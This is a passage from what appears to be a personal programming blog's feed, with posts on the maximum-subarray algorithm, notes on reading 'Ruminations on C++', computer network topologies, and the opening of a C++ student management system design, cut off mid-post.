id="&#x5206;&#x6CBB;&#x7B97;&#x6CD5;-O-nlongn"><a href="#&#x5206;&#x6CBB;&#x7B97;&#x6CD5;-O-nlongn" class="headerlink" title="&#x5206;&#x6CBB;&#x7B97;&#x6CD5; (O(nlongn))"></a>&#x5206;&#x6CBB;&#x7B97;&#x6CD5; (O(nlongn))</h3><p>&#x5206;&#x6CBB;&#x539F;&#x7406;&#xFF1A;</p><blockquote><p>&#x8981;&#x89E3;&#x51B3;&#x89C4;&#x6A21;&#x4E3A;n&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x53EF;&#x4EE5;&#x9012;&#x5F52;&#x5730;&#x89E3;&#x51B3;&#x4E24;&#x4E2A;&#x89C4;&#x6A21;&#x8FD1;&#x4F3C;&#x4E3A;n/2&#x7684;&#x5B50;&#x95EE;&#x9898;&#xFF0C;&#x7136;&#x540E;&#x5BF9;&#x4ED6;&#x4EEC;&#x7684;&#x7B54;&#x6848;&#x8FDB;&#x884C;&#x5408;&#x5E76;&#x4EE5;&#x5F97;&#x5230;&#x6574;&#x4E2A;&#x95EE;&#x9898;&#x7684;&#x7B54;&#x6848;&#x3002;</p></blockquote><p>&#x5728;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x4E2D;&#x5148;&#x628A;&#x6574;&#x4E2A;&#x6570;&#x7EC4;&#x5212;&#x5206;&#x4E3A;&#x8FD1;&#x4F3C;&#x76F8;&#x7B49;&#x7684;&#x5B50;&#x6570;&#x7EC4;&#xFF08;Ma&#xFF0C; Mb&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x627E;&#x51FA;&#x5B50;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x6700;&#x5927;&#x5B50;&#x6570;&#x7EC4;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;&#x662F;&#x6700;&#x5927;&#x548C;&#x5E76;&#x4E0D;&#x4E00;&#x5B9A;&#x5728;&#x5355;&#x4E2A;&#x5B50;&#x6570;&#x7EC4;&#x4E2D;&#x4E5F;&#x6709;&#x53EF;&#x80FD;&#x540C;&#x65F6;&#x8DE8;&#x8D8A;&#x5DE6;&#x53F3;&#x4E24;&#x4E2A;&#x6570;&#x7EC4;&#xFF08;Mc&#xFF09;&#x3002;</p><p>&#x5982;&#x679C;&#x662F;&#x8DE8;&#x8D8A;&#x5DE6;&#x53F3;&#x4E24;&#x4E2A;&#x6570;&#x7EC4;&#x7684;&#x8BDD;&#xFF0C;&#x5DE6;&#x8FB9;&#xFF08;Ma&#xFF09;&#x4E00;&#x5B9A;&#x662F;&#x5305;&#x62EC;&#x6700;&#x53F3;&#x8FB9;&#x5143;&#x7D20;&#x7684;&#x6700;&#x5927;&#x5B50;&#x6570;&#x7EC4;&#xFF0C;&#x53F3;&#x8FB9;&#xFF08;Mb&#xFF09;&#x4E00;&#x5B9A;&#x662F;&#x5305;&#x62EC;&#x6700;&#x5DE6;&#x8FB9;&#x5143;&#x7D20;&#x7684;&#x6700;&#x5927;&#x5B50;&#x6570;&#x7EC4;&#x3002;&#x7EFC;&#x5408;&#x4EE5;&#x4E0A;&#x56E0;&#x7D20;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#xFF1A;<br></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">maxsum3</span><span class="params">(l, u)</span></span></span><br><span class="line"><span class="function"><span class="title">if</span> <span class="params">(l &gt; u)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">return</span> 0</span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="params">(l == u)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">return</span> <span class="title">max</span><span class="params">(<span class="number">0</span>, x[l])</span></span></span><br><span class="line"><span class="function">m </span>= (l + u) / <span class="number">2</span></span><br><span class="line">    <span class="comment">// find max crossing to left.</span></span><br><span class="line">    lmax = sum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> (i = m; i &gt;= l; --i)</span><br><span class="line">    sum += x[i]</span><br><span class="line">        lmax = max(lmax, sum)</span><br><span class="line">    <span class="comment">// find max crossing to right.</span></span><br><span class="line">    rmax = sum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i = (m, u]</span><br><span class="line">    sum += x[i]</span><br><span class="line">        rmax = max(rmax, sum)</span><br><span class="line">    <span class="keyword">return</span> max(lmax + rmax, maxsum3(l, m), maxsum3(m+<span class="number">1</span>, u))</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x626B;&#x63CF;&#x7B97;&#x6CD5;-&#xFF08;O&#xFF08;n&#xFF09;&#xFF09;"><a href="#&#x626B;&#x63CF;&#x7B97;&#x6CD5;-&#xFF08;O&#xFF08;n&#xFF09;&#xFF09;" class="headerlink" title="&#x626B;&#x63CF;&#x7B97;&#x6CD5; &#xFF08;O&#xFF08;n&#xFF09;&#xFF09;"></a>&#x626B;&#x63CF;&#x7B97;&#x6CD5; &#xFF08;O&#xFF08;n&#xFF09;&#xFF09;</h3><p>&#x4ECE;&#x6570;&#x7EC4;&#x7684;&#x6700;&#x5DE6;&#x7AEF;&#x5411;&#x6700;&#x53F3;&#x7AEF;&#x8FDB;&#x884C;&#x626B;&#x63CF;&#xFF0C;&#x5E76;&#x8BB0;&#x4E0B;&#x6240;&#x9047;&#x5230;&#x7684;&#x6700;&#x5927;&#x603B;&#x548C;&#x5B50;&#x5411;&#x91CF;&#x3002;&#x6700;&#x5927;&#x603B;&#x548C;&#x7684;&#x521D;&#x59CB;&#x503C;&#x8BBE;&#x7F6E;&#x4E3A;0&#x3002;&#x5047;&#x8BBE;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x89E3;&#x51B3;&#x4E86;x[i-1]&#x90A3;&#x4E48;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x628A;&#x6570;&#x7EC4;&#x6269;&#x5C55;&#x5230;x[i],&#x6700;&#x5927;&#x603B;&#x548C;&#x8981;&#x4E48;&#x51FA;&#x73B0;&#x5728;x&#x4E2D;&#xFF0C;&#x8981;&#x4E48;&#x7ED3;&#x675F;&#x4F4D;&#x7F6E;&#x4E3A;i&#xFF0C;&#x5E76;&#x5C06;i&#x5904;&#x7684;&#x6700;&#x5927;&#x503C;&#x8BBE;&#x7F6E;&#x4E3A;0&#xFF0C;&#x5728;&#x8FDB;&#x884C;&#x4E0B;&#x4E00;&#x6B65;&#x7684;&#x626B;&#x63CF;&#x3002;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5F97;&#x5230;&#x4E0B;&#x9762;&#x7684;&#x4EE3;&#x7801;&#xFF1A;<br></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">maxsofar = <span class="number">0</span></span><br><span class="line">maxendinghere = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i = [<span class="number">0</span>, n)</span><br><span class="line">maxendinghere = max(maxendinghere+x[i], <span class="number">0</span>)</span><br><span class="line">    maxsofar = max(maxendinghere, maxsofar)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x79CD;&#x7B97;&#x6CD5;&#x4E5F;&#x79F0;&#x4E3A;&#x7EBF;&#x6027;&#x7B97;&#x6CD5;&#x3002;</p><h3 id="&#x539F;&#x7406;"><a href="#&#x539F;&#x7406;" class="headerlink" title="&#x539F;&#x7406;"></a>&#x539F;&#x7406;</h3><ul><li>&#x4FDD;&#x5B58;&#x72B6;&#x6001;&#xFF0C;&#x907F;&#x514D;&#x91CD;&#x590D;&#x8BA1;&#x7B97;&#x3002;</li><li>&#x5C06;&#x4FE1;&#x606F;&#x9884;&#x5904;&#x7406;&#x81F3;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x4E2D;&#x3002;</li><li>&#x5206;&#x6CBB;&#x7B97;&#x6CD5;&#x3002;</li><li>&#x626B;&#x63CF;&#x7B97;&#x6CD5;&#x3002;</li><li>&#x7D2F;&#x79EF;&#x3002;</li><li>&#x4E0B;&#x754C;&#x3002;</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>《Ruminations on C++》</title>
      <link href="/2018/11/06/Ruminations-on-C/"/>
      <url>/2018/11/06/Ruminations-on-C/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_23d8929ffb7cf881eb646a02ccb62173.jpg" alt=""></p><a id="more"></a><p>&#x7528;&#x4E86;&#x5341;&#x5929;&#x5DE6;&#x53F3;&#x7684;&#x65F6;&#x95F4;&#x628A;&#x300A;Ruminations on C++&#x300B;&#x8FD9;&#x672C;&#x4E66;&#x7ED9;&#x8BFB;&#x5B8C;&#x4E86;&#xFF0C;&#x81EA;&#x5DF1;&#x4EE5;&#x524D;&#x5E76;&#x6CA1;&#x6709;&#x611F;&#x89C9;&#x5230;C++&#x6709;&#x4EC0;&#x4E48;&#x96BE;&#x7406;&#x89E3;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x5F53;&#x6211;&#x770B;&#x5B8C;&#x8FD9;&#x672C;&#x4E66;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x624D;&#x53D1;&#x73B0;&#x81EA;&#x5DF1;&#x771F;&#x7684;&#x662F;&#x5BF9;C++&#x4E00;&#x70B9;&#x90FD;&#x4E0D;&#x4E86;&#x89E3;&#x3002;&#x91CC;&#x9762;&#x7684;&#x5F88;&#x591A;&#x6982;&#x5FF5;&#x5BF9;&#x4E8E;&#x6211;&#x6765;&#x8BF4;&#x90FD;&#x662F;&#x7B2C;&#x4E00;&#x6B21;&#x542C;&#x8BF4;&#xFF0C;&#x522B;&#x8BF4;&#x7406;&#x89E3;&#x4E86;&#x5C31;&#x7B97;&#x662F;&#x8BFB;&#x90FD;&#x5F88;&#x96BE;&#x8BFB;&#x61C2;&#x3002;&#x6BD4;&#x5982;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x7A0B;&#x5E8F;&#xFF1A;</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> {</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        Test();</span><br><span class="line">        Test(<span class="keyword">const</span> Test&amp;);</span><br><span class="line">        ~Test();</span><br><span class="line">        Test&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> Test&amp;);</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">int</span> count;</span><br><span class="line">        <span class="keyword">int</span> id;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> Test::count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">Test::Test() {</span><br><span class="line">    id = ++count;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Test &quot;</span> &lt;&lt; id </span><br><span class="line">         &lt;&lt; <span class="string">&quot; default constructor&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">Test::Test(<span class="keyword">const</span> Test&amp; t) {</span><br><span class="line">    id = ++count;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Test &quot;</span> &lt;&lt; id</span><br><span class="line">         &lt;&lt; <span class="string">&quot; copied from &quot;</span> &lt;&lt; t.id &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">Test&amp; Test::<span class="keyword">operator</span>=(<span class="keyword">const</span> Test&amp; t) {</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Test &quot;</span> &lt;&lt; id </span><br><span class="line">         &lt;&lt; <span class="string">&quot; assigned from &quot;</span> &lt;&lt; t.id &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">Test::~Test() {</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Test &quot;</span> &lt;&lt; id &lt;&lt; <span class="string">&quot; destroyed&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    Test s;</span><br><span class="line">    <span class="function">Test <span class="title">t</span><span class="params">(s)</span></span>;</span><br><span class="line">    s = t;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>&#x6700;&#x540E;&#x7684;&#x8FD0;&#x884C;&#x7ED3;&#x679C;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;<br><img src="http://p4wiqzx0i.bkt.clouddn.com/Screenshot%20from%202018-11-08%2016-41-18.png" alt=""></p><p>&#x4EE5;&#x6211;&#x73B0;&#x5728;&#x7684;&#x77E5;&#x8BC6;&#x6211;&#x5B8C;&#x5168;&#x4E0D;&#x80FD;&#x7406;&#x89E3;&#x4E3A;&#x4EC0;&#x4E48;&#x7ED3;&#x679C;&#x4F1A;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF0C;&#x8FD9;&#x91CC;&#x9762;&#x6839;&#x672C;&#x5C31;&#x6CA1;&#x6709;&#x8F93;&#x5165;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x6700;&#x540E;&#x8F93;&#x51FA;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x51FA;&#x73B0;1&#x548C;2&#xFF1F;</p><p>&#x4E66;&#x4E0A;&#x8BF4;&#x8FD9;&#x91CC;&#x7528;&#x5230;&#x4E86;&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF0C;&#x6790;&#x6784;&#x51FD;&#x6570;&#x548C;&#x8D4B;&#x503C;&#x64CD;&#x4F5C;&#x7B26;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x867D;&#x7136;&#x81EA;&#x5DF1;&#x628A;&#x4E66;&#x770B;&#x8FC7;&#x4E86;&#x4E00;&#x904D;&#xFF0C;&#x4F46;&#x662F;&#x5BF9;&#x8FD9;&#x4E9B;&#x4E1C;&#x897F;&#x81EA;&#x5DF1;&#x8FD8;&#x771F;&#x7684;&#x4E0D;&#x7406;&#x89E3;&#x3002;</p><p>&#x524D;&#x9762;&#x8FD8;&#x6709;&#x4E9B;&#x7AE0;&#x8282;&#x4ECB;&#x7ECD;&#x4E86;&#x53E5;&#x67C4;&#xFF0C;&#x8FED;&#x4EE3;&#x5668;&#xFF0C; &#x914D;&#x63A5;&#x5668;&#xFF0C; &#x63A5;&#x53E3;&#xFF0C; &#x5E93; &#x548C;&#x6A21;&#x677F;&#x7684;&#x76F8;&#x5173;&#x77E5;&#x8BC6;&#xFF0C;&#x81EA;&#x5DF1;&#x4EE5;&#x524D;&#x5237;OJ&#x7684;&#x65F6;&#x5019;&#x5B8C;&#x5168;&#x7528;&#x4E0D;&#x5230;&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x63A5;&#x89E6;&#x771F;&#x7684;&#x662F;&#x4E00;&#x5934;&#x96FE;&#x6C34;&#x3002;</p><p>&#x901A;&#x8FC7;&#x8FD9;&#x672C;&#x4E66;&#x81EA;&#x5DF1;&#x867D;&#x7136;&#x6709;&#x5F88;&#x591A;&#x7684;&#x7591;&#x60D1;&#xFF0C;&#x4F46;&#x540C;&#x65F6;&#x4E5F;&#x8BA4;&#x8BC6;&#x5230;&#x4E86;&#x81EA;&#x5DF1;&#x7684;&#x5F88;&#x591A;&#x4E0D;&#x8DB3;&#x3002;</p><p><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_rumiantions.jpeg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reading </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Computer Networks</title>
      <link href="/2018/11/03/Computer-Networks/"/>
      <url>/2018/11/03/Computer-Networks/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_5-23.png" alt=""></p><a id="more"></a><h3 id="Network-topology"><a href="#Network-topology" class="headerlink" title="Network topology"></a>Network topology</h3><h4 id="mash-topology"><a href="#mash-topology" class="headerlink" title="mash topology"></a>mash topology</h4><p><img src="https://cdncontribute.geeksforgeeks.org/wp-content/uploads/1-75.png" alt=""></p><p><strong>Advantages of this topology :</strong></p><ul><li>robust.</li><li>Fault is diagnosed easily. </li><li>Provides security and privacy.</li></ul><p><strong>Problems with this topology :</strong></p><ul><li>Installation and configuration is difficult.</li><li>suitable for less number of devices.</li><li>Cost of maintenance is high.</li></ul><h4 id="star-topology"><a href="#star-topology" class="headerlink" title="star topology"></a>star topology</h4><p><img src="https://cdncontribute.geeksforgeeks.org/wp-content/uploads/2-49.png" alt=""></p><p><strong>Advantages of this topology :</strong></p><ul><li>easy to set up.</li><li>Each device require only 1 port.</li></ul><p><strong>Problems with this topology :</strong></p><ul><li>If the concentrator (hub) on which the whole topology relies fails, the whole system will crash down.</li><li>Cost of installation is high.</li><li>Performance is based on the single concentrator i.e. hub.</li></ul><h4 id="bus-topology"><a href="#bus-topology" class="headerlink" title="bus topology"></a>bus topology</h4><p><img src="https://cdncontribute.geeksforgeeks.org/wp-content/uploads/3-55.png" alt=""></p><p><strong>Advantages of this topology :</strong></p><ul><li>Cost of the cable is less as compared to other topology, but it is used to built small networks.</li></ul><p><strong>Problems with this topology :</strong></p><ul><li>If the common cable fails, then the whole system will crash down.</li><li>If the network traffic is heavy, it increases collisions in the network. To avoid this, various protocols are used in MAC layer known as Pure Aloha, Slotted Aloha, CSMA/CD etc.</li></ul><h4 id="ring-topology"><a href="#ring-topology" class="headerlink" title="ring topology :"></a>ring topology :</h4><p><img src="https://cdncontribute.geeksforgeeks.org/wp-content/uploads/4-32.png" alt=""></p><p><strong>Advantages of this topology :</strong></p><ul><li>The possibility of collision is minimum in this type of topology.</li><li>Cheap to install and expand.</li></ul><p><strong>Problems with this topology :</strong></p><ul><li>Troubleshooting is difficult in this topology.</li><li>Addition of stations in between or removal of stations can disturb the whole topology.</li></ul><h4 id="Hybird-topology"><a href="#Hybird-topology" class="headerlink" title="Hybird topology"></a>Hybird topology</h4><p><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_5-23.png" alt=""></p><p>A hybrid topology which is a combination of ring and star topology.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> computer network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> computer network </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>C++ implementation student management system</title>
      <link href="/2018/11/02/C-implemation-student-manager-system/"/>
      <url>/2018/11/02/C-implemation-student-manager-system/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/1521537778978.png" alt=""></p><a id="more"></a><p>&#x8FD9;&#x51E0;&#x5929;&#x4E00;&#x76F4;&#x5728;&#x770B;&#x300A;C++&#x6C89;&#x601D;&#x5F55;&#x300B;&#x8FD9;&#x672C;&#x4E66;&#xFF0C;&#x56E0;&#x4E3A;&#x4E4B;&#x524D;&#x4E00;&#x76F4;&#x6CA1;&#x6709;&#x63A5;&#x89E6;&#x8FC7;&#x9762;&#x5411;&#x5BF9;&#x8C61;&#x7F16;&#x7A0B;&#xFF0C;&#x521A;&#x5F00;&#x59CB;&#x770B;&#x7684;&#x65F6;&#x5019;&#x611F;&#x89C9;&#x5F88;&#x96BE;&#x7406;&#x89E3;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x770B;&#x4E00;&#x773C;&#x5C31;&#x8FC7;&#x53BB;&#x4E86;&#x3002;&#x4ECA;&#x5929;&#x9759;&#x4E0B;&#x5FC3;&#x6765;&#x53C8;&#x770B;&#x4E86;&#x51E0;&#x9875;&#xFF0C;&#x53D1;&#x73B0;&#x9762;&#x5411;&#x5BF9;&#x8C61;&#x6709;&#x5F88;&#x591A;&#x7684;&#x4F18;&#x70B9;&#x3002;&#x4E8E;&#x662F;&#x4E4E;&#xFF0C;&#x81EA;&#x5DF1;&#x5C31;&#x5728;&#x5B9E;&#x9A8C;&#x697C;&#x4E0A;&#x627E;&#x4E86;&#x4E2A;&#x5173;&#x4E8E;c++&#x7684;&#x5B9E;&#x9A8C;&#x3002;<br><img src="http://p4wiqzx0i.bkt.clouddn.com/e46f9dc2d0bc9e5f62ab688e1675b616.png" alt=""></p><p>&#x5728;&#x7F51;&#x4E0A;&#x627E;&#x4E86;&#x4E00;&#x4E2A;&#x5173;&#x4E8E;&#x5B66;&#x4E60;&#x91D1;&#x5B57;&#x5854;&#x7684;&#x56FE;&#x7247;&#x611F;&#x89C9;&#x5F88;&#x7B26;&#x5408;&#x81EA;&#x5DF1;&#x7684;&#x4EB2;&#x8EAB;&#x611F;&#x53D7;&#x3002;&#x771F;&#x7684;&#x60F3;&#x90A3;&#x53E5;&#x53E4;&#x8BD7;&#x8BF4;&#x7684;&#x4E00;&#x6837;&#x201C;&#x4E66;&#x4E0A;&#x5F97;&#x6765;&#x7EC8;&#x89C9;&#x6D45;&#xFF0C;&#x7EDD;&#x77E5;&#x6B64;&#x4E8B;&#x8981;&#x8EAC;&#x884C;&#x3002;&#x201D;&#x3002;</p><hr><h3 id="&#x9700;&#x6C42;&#x5206;&#x6790;&#xFF1A;"><a href="#&#x9700;&#x6C42;&#x5206;&#x6790;&#xFF1A;" class="headerlink" title="&#x9700;&#x6C42;&#x5206;&#x6790;&#xFF1A;"></a>&#x9700;&#x6C42;&#x5206;&#x6790;&#xFF1A;</h3><p>&#x9879;&#x76EE;&#x529F;&#x80FD;&#x9700;&#x6C42;&#x53EF;&#x4EE5;&#x62C6;&#x5206;&#x6210;&#x4E0B;&#x9762;&#x4E24;&#x4E2A;&#x6A21;&#x5757;&#xFF1A;</p><ul><li>&#x547D;&#x4EE4;&#x8F93;&#x5165;&#x53CA;&#x5904;&#x7406;</li><li>&#x8BFE;&#x7A0B;&#x5B58;&#x50A8;&#x53CA;&#x7BA1;&#x7406;</li></ul><p>&#x63D0;&#x70BC;&#x6BCF;&#x4E2A;&#x6A21;&#x5757;&#x4E2D;&#x7684;&#x53C2;&#x4E0E;&#x8005;&#xFF1A;</p><ul><li>&#x547D;&#x4EE4;&#x7BA1;&#x7406;&#x5BF9;&#x8C61;</li><li>&#x8BFE;&#x7A0B;&#x5BF9;&#x8C61;</li><li>&#x8BFE;&#x7A0B;&#x7BA1;&#x7406;&#x5BF9;&#x8C61;</li><li>&#x5176;&#x4E2D;&#x547D;&#x4EE4;&#x7BA1;&#x7406;&#x5BF9;&#x8C61;&#x5BF9;&#x547D;&#x4EE4;&#x8FDB;&#x884C;&#x7BA1;&#x7406;&#x3002;&#x8BFE;&#x7A0B;&#x5BF9;&#x8C61;&#x5B58;&#x50A8;&#x6BCF;&#x4E2A;&#x8BFE;&#x7A0B;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x8BFE;&#x7A0B;&#x7BA1;&#x7406;&#x5BF9;&#x8C61;&#x5BF9;&#x8BFE;&#x7A0B;&#x5217;&#x8868;&#x8FDB;&#x884C;&#x7EF4;&#x62A4;&#x548C;&#x7BA1;&#x7406;&#x3002;</li></ul><p>&#x6211;&#x4EEC;&#x9700;&#x8981;&#x8BFE;&#x7A0B;&#x7C7B;&#xFF0C;&#x8BFE;&#x7A0B;&#x7BA1;&#x7406;&#x7C7B;&#xFF0C;&#x547D;&#x4EE4;&#x7BA1;&#x7406;&#x7C7B;&#x4E09;&#x4E2A;&#x7C7B;&#x3002;&#x5982;&#x679C;&#x547D;&#x4EE4;&#x5BF9;&#x8C61;&#x5305;&#x542B;&#x7684;&#x4FE1;&#x606F;&#x5F88;&#x590D;&#x6742;&#x7684;&#x8BDD;&#x4E5F;&#x53EF;&#x4EE5;&#x5355;&#x72EC;&#x8BBE;&#x8BA1;&#x6210;&#x7C7B;&#xFF0C;&#x5728;&#x672C;&#x9879;&#x76EE;&#x4E2D;&#x547D;&#x4EE4;&#x4EC5;&#x4EC5;&#x662F;&#x4E00;&#x4E2A;&#x6570;&#x5B57;&#x53CA;&#x76F8;&#x5173;&#x7684;&#x63CF;&#x8FF0;&#x4FE1;&#x606F;&#xFF0C;&#x4E3A;&#x4E86;&#x4FBF;&#x4E8E;&#x67E5;&#x627E;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x628A;&#x547D;&#x4EE4;&#x5B9A;&#x4E49;&#x5728;&#x547D;&#x4EE4;&#x7BA1;&#x7406;&#x7C7B;&#x4E2D;&#x3002;</p><h3 id="&#x62BD;&#x8C61;&#x4E0E;&#x7EC6;&#x5316;"><a href="#&#x62BD;&#x8C61;&#x4E0E;&#x7EC6;&#x5316;" class="headerlink" title="&#x62BD;&#x8C61;&#x4E0E;&#x7EC6;&#x5316;"></a>&#x62BD;&#x8C61;&#x4E0E;&#x7EC6;&#x5316;</h3><p>&#x6839;&#x636E;&#x4E0A;&#x9762;&#x7684;&#x9700;&#x6C42;&#x5206;&#x6790;&#xFF0C;&#x8BBE;&#x8BA1;&#x6240;&#x9700;&#x7684;&#x7C7B;&#xFF1A;</p><p>&#x5B9A;&#x4E49;&#x8BFE;&#x7A0B;&#x7C7B;Course&#x53CA;&#x8BFE;&#x7A0B;&#x7BA1;&#x7406;&#x7C7B;CourseManager&#xFF0C;&#x547D;&#x4EE4;&#x5904;&#x7406;&#x7C7B;CmdManager</p><p>Course&#x7C7B;&#x6210;&#x5458;&#x5305;&#x62EC;&#xFF1A;</p><ul><li>&#x8BFE;&#x7A0B;ID&#xFF08;&#x8BFE;&#x7A0B;&#x5BF9;&#x8C61;&#x521B;&#x5EFA;&#x65F6;&#x81EA;&#x52A8;&#x751F;&#x6210;&#xFF09;</li><li>&#x8BFE;&#x7A0B;&#x540D;&#x79F0;</li><li>Course&#x7C7B;&#x6210;&#x5458;&#x51FD;&#x6570;&#x81F3;&#x5C11;&#x5305;&#x62EC;&#xFF1A;</li><li>&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF08;&#x53C2;&#x6570;&#x8BFE;&#x7A0B;&#x540D;&#x79F0;&#xFF09;</li><li>&#x62F7;&#x8D1D;&#x6784;&#x9020;&#x51FD;&#x6570;</li><li>&#x8FD4;&#x56DE;&#x548C;&#x8BBE;&#x7F6E;&#x8BFE;&#x7A0B;&#x540D;&#x79F0;</li><li>&#x83B7;&#x5F97;&#x8BFE;&#x7A0B;